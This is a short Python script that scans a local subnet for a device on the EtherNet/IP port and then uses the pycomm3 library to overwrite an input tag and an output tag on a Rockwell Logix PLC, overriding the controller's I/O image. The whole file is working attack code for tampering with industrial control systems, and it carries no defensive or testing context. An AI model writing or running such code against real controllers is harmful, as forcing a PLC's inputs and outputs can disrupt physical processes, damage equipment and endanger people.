import socket
import pycomm3
from pycomm3 import LogixDriver

# Function to discover the PLC's IP address
def discover_plc_ip():
    # Define the subnet and range to scan
    subnet = "192.168.1."
    start_ip = 1
    end_ip = 254

    for i in range(start_ip, end_ip + 1):
        ip = f"{subnet}{i}"
        try:
            # Attempt to connect to the PLC
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                result = s.connect_ex((ip, 44818))  # 44818 is the default port for EtherNet/IP
                if result == 0:
                    print(f"PLC found at IP: {ip}")
                    return ip
        except socket.error:
            continue

    print("PLC not found in the specified range.")
    return None

# Function to manipulate the I/O image
def manipulate_io_image(plc_ip, input_tag, output_tag, input_value, output_value):
    try:
        with LogixDriver(plc_ip) as plc:
            # Override the input tag
            plc.write((input_tag, input_value))
            print(f"Input tag {input_tag} set to {input_value}")

            # Override the output tag
            plc.write((output_tag, output_value))
            print(f"Output tag {output_tag} set to {output_value}")

    except Exception as e:
        print(f"Error manipulating I/O image: {e}")

# Main function
def main():
    # Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    if plc_ip is None:
        return

    # Define the tags and values to manipulate
    input_tag = "InputTag"
    output_tag = "OutputTag"
    input_value = 1  # Example value to set the input tag to
    output_value = 0  # Example value to set the output tag to

    # Manipulate the I/O image
    manipulate_io_image(plc_ip, input_tag, output_tag, input_value, output_value)

if __name__ == "__main__":
    main()